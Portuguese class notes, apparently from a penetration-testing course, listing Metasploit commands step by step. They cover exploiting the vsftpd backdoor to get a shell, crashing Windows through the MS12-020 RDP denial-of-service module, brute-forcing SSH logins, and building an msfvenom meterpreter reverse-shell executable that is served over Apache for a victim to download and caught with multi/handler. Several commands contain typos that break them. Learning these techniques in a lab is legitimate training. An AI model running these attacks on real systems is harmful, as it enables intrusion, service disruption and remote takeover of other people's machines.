resumos das aulas anteriores 

falhas ftp:

Linux kali : msfconsole init

procurar o backdor: search vsftpd


info: info exploit/unix/ftp/vsfftpd_backdoor

usar: use exploit/unix/ftp/vsfftpd_backdoor

alterar ip: set rhots <IP>


mostrar os payloads show payloads

atribuir o payload: set payload payload/cmd/unix/Interact

show options

executar: exploit 


depois navegar ate o arquivo desejado!!!


tela azul windows

Kali
msconsole invadir o pc Windows

search rdp

use auxiliary/dos/Windows/rdp/ms12_020_maxchannelids 

set rhosts <IP>

run


ssh falhas

msconsole

search ssh_login

auxiliary/scanner/ssh/ssh_login

criar arquivos user / PASSWORD

set rhosts 192.168.1.21
set PASS_FILE caminho do arquivo
set user_file caminho do arquivo
exploit

backdor executável


msfvenom -p Windows/meterpreter/reverse_tcp -a x86 platform widows -f exe LHOST = <IP> <PORT> -o nome do executável

service apache2 start

cp nome do arquivo /var/www/html
cd / var/www/html
ls

maquina do  

ir no local no Windows  e baixar pelo ip


msfconsole

use multi/handler

set payload Windows/meterpreter/reverse_tcp

set LHOST <ip>
set LPORT <PORT>
run
 

